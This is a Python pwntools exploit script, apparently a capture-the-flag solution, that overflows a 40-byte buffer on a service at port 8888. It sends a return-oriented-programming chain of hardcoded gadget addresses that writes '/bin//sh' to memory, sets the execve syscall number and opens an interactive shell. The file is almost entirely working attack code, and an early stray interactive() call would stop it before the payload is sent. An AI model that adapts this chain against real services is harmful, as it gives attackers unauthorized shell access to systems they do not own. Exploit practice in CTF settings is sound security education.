from pwn import *

context.arch = 'amd64'

r = remote('127.0.0.1',8888)
#r = remote('csie.ctf.tw',10133)

r.recvuntil(':')
#note rsi keep the addr of buf
#the offset from buf to ret is 40

#r.recvuntil('lol',timeout = 7)
r.interactive()
pre = '\0'*40

buf_address = 0x6c9a20             #could be any address which is rw,this position is at data section

pop_rsi = p64(0x401577)                 #0x0000000000401577) # pop rsi ; ret
xor_eax = p64(0x4014d0)                 #0x00000000004014d0 : xor eax, eax ; ret
pop_rdi = p64(0x401456)                 #0x0000000000401456) # pop rdi ; ret
pop_rdx = p64(0x4427e6)                 #0x00000000004427e6 : pop rdx ; ret
mov_rax_rdx = p64(0x426d58)             #0x0000000000426d58 : mov rax, rdx ; ret
leave_ret = p64(0x400988)               #0x0000000000400988 : leave ; ret


#set rdi
set_rdi_gadget = pop_rdi + p64(buf_address)
#0x0000000000442809 : pop rdx ; pop rsi ; ret
buf = p64(0x442809) + '\0'*8 + '/bin//sh'
#0x000000000047a502 : mov qword ptr [rdi], rsi ; ret
mov_sh_gadget = p64(0x47a502)


#inject /bin//sh to buf_address
inject_buf = set_rdi_gadget + buf + mov_sh_gadget + pop_rsi + '\0'*8 
#padding \0
#inject_buf += pop_rsi + p64(buf_address + 0x8) + xor_eax + mov_sh_gadget



#set eax to 0x3b
add_eax_0x1d = p64(0x4260ce)        #0x1d = 29 ,59 = 29*2 + 1
add_eax_1 = p64(0x466671)

set_eax_gadget = xor_eax + add_eax_0x1d*2 + add_eax_1

syscall_ret = p64(0x4671b5)
#construct rop
#rop = pre + inject_buf + set_rdi_gadget +set_eax_gadget + p64(0x0000000000401577) +'\0'*8 + syscall_ret
rop = 'A'*40  + inject_buf + set_eax_gadget + syscall_ret

print 'totcal rop len : ',  len(rop) 
r.send(rop)
r.interactive()

